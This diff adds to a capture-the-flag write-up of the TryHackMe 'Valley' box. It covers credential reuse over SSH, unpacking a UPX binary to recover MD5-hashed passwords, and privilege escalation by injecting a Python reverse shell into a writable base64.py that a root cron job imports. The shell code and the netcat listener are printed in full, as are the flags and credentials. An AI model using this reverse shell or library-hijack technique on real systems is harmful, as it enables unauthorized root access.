@@ -244,4 +244,192 @@ This means there was a form submitted - over http... credentials again?
 After filtering by this we see packet 2335 is the only packet with that protocol, and we get another set of credentials:
 *valleyDev:ph0t0s1234*
 
+Lets try to login to FTP with these credentials as well:
+```terminal
+ftp 10.10.235.73 37370
+Connected to 10.10.235.73.
+220 (vsFTPd 3.0.3)
+Name (10.10.235.73:root): valleyDev
+331 Please specify the password.
+Password:
+500 OOPS: vsftpd: refusing to run with writable root inside chroot()
+Login failed.
+421 Service not available, remote server has closed connection
+ftp> 
+```
+Well, that seems to not be working, lets try ssh with the same credentials
+```terminal
+ssh valleyDev@10.10.235.73
+valleyDev@10.10.235.73's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64)
 
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+ * Introducing Expanded Security Maintenance for Applications.
+   Receive updates to over 25,000 software packages with your
+   Ubuntu Pro subscription. Free for personal use.
+
+     https://ubuntu.com/pro
+valleyDev@valley:~$
+```
+Nice.   Let's get our first flag and see if the other credentials work on this box aswell.
+```terminal
+valleyDev@valley:~$ ls
+user.txt
+valleyDev@valley:~$ cat user.txt
+THM{k@l1_1n_th3_v@lley}
+```
+```terminal
+valleyDev@valley:~$ su siemDev
+Password: 
+$ whoami
+siemDev
+$ 
+```
+Reusing credentials is so bad, lets see what other users we have.
+```terminal
+$ ls -la /home
+total 752
+drwxr-xr-x  5 root      root        4096 Mar  6  2023 .
+drwxr-xr-x 21 root      root        4096 Mar  6  2023 ..
+drwxr-x---  4 siemDev   siemDev     4096 Mar 20  2023 siemDev
+drwxr-x--- 16 valley    valley      4096 Mar 20  2023 valley
+-rwxrwxr-x  1 valley    valley    749128 Aug 14  2022 valleyAuthenticator
+drwxr-xr-x  5 valleyDev valleyDev   4096 Mar 13  2023 valleyDev
+```
+One more user named valley, and an executable. Lets get that over to our machine to analyze it.
+```terminal
+scp valleyDev@10.10.235.73:/home/valleyAuthenticator valleyAuthenticator
+```
+```terminal
+root@ip-10-10-98-131:~# file valleyAuthenticator 
+valleyAuthenticator: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, stripped
+```
+We see it is in ELF format, we can use `strings` to analyze the file, but I find it noisy and ghidra can do a better job. Let's start by looking at the strings.
+![website-screenshot](assets/img/writeupscreenshots/valley-13.png)
+No intelligible strings besides "packed with the UPX executable packer", after performing research into the upx packer and visiting the url included, we can see this is easily unpacked with the upx application. We can download the latest release from github and hopefully have a better view into the internal workings.
+```terminal
+root@ip-10-10-98-131:~/upx-4.2.3-amd64_linux# ./upx -d '../valleyAuthenticator' -o '../valleyUnpacked'
+                       Ultimate Packer for eXecutables
+                          Copyright (C) 1996 - 2024
+UPX 4.2.3       Markus Oberhumer, Laszlo Molnar & John Reiser   Mar 27th 2024
+
+        File size         Ratio      Format      Name
+   --------------------   ------   -----------   -----------
+   2290962 <-    749128   32.70%   linux/amd64   valleyUnpacked
+
+Unpacked 1 file.
+```
+Looking again with ghidra at the newly unpacked executable, we can find two md5 strings right above the program prompts.
+![website-screenshot](assets/img/writeupscreenshots/valley-14.png)
+We could use hashcat or john to try and crack this, but lets see if our favorite online site has them first.
+![website-screenshot](assets/img/writeupscreenshots/valley-15.png)
+Here we have a set of credentials! *valley:liberty123*
+Let's see if they work on the box:
+```terminal
+$ su valley
+Password: 
+valley@valley:/home/valleyDev$ 
+```
+Tsk, tsk, tsk. not good password policy.
+
+After doing some enumeration, we stumble upon:
+```terminal
+valley@valley:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+1  *    * * *   root    python3 /photos/script/photosEncrypt.py
+```
+Our first hint at a possible privilege escalation, lets see the permissions on this file.
+
+```terminal
+valley@valley:/photos/script$ ls -la photosEncrypt.py
+-rwxr-xr-x 1 root root 621 Mar  6  2023 photosEncrypt.py
+```
+Unfortunate, lets take a look inside.
+```python
+#!/usr/bin/python3
+import base64
+for i in range(1,7):
+# specify the path to the image file you want to encode
+	image_path = "/photos/p" + str(i) + ".jpg"
+
+# open the image file and read its contents
+	with open(image_path, "rb") as image_file:
+          image_data = image_file.read()
+
+# encode the image data in Base64 format
+	encoded_image_data = base64.b64encode(image_data)
+
+# specify the path to the output file
+	output_path = "/photos/photoVault/p" + str(i) + ".enc"
+
+# write the Base64-encoded image data to the output file
+	with open(output_path, "wb") as output_file:
+    	  output_file.write(encoded_image_data)
+```
+We can see it imports base64, lets see if we have anyway to inject ourselves in here.
+```terminal
+valley@valley:/photos/script$ locate base64
+...
+/usr/lib/python3.8/base64.py
+...
+```
+This one is the only one that matters, lets look at our permissions
+```terminal
+valley@valley:~$ ls -la /usr/lib/python3.8/base64.py 
+-rwxrwxr-x 1 root valleyAdmin 20382 Mar 13  2023 /usr/lib/python3.8/base64.py
+```
+```terminal
+valley@valley:~$ id
+uid=1000(valley) gid=1000(valley) groups=1000(valley),1003(valleyAdmin)
+```
+As valley is a member of the valleyAdmin group, this means we can edit the file and inject some code! Lets get to it.
+```python
+import socket,os,pty
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.98.131",4445))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+pty.spawn("/bin/sh")
+```
+I will use this short code snippet to send myself a shell after opening a listener with netcat
+```terminal
+nc -lvnp 4445
+```
+We can wait or try and run crontab if you are impatient.
+```terminal
+Listening on [0.0.0.0] (family 0, port 4445)
+Connection from 10.10.235.73 37952 received!
+# whoami
+whoami
+root
+# cat /root/root.txt
+cat /root/root.txt
+THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}
+```
+That's all folks!
+
+This was a very fun box to go through that touched on a lot of important skills and concepts, pivot, pivot, pivot!
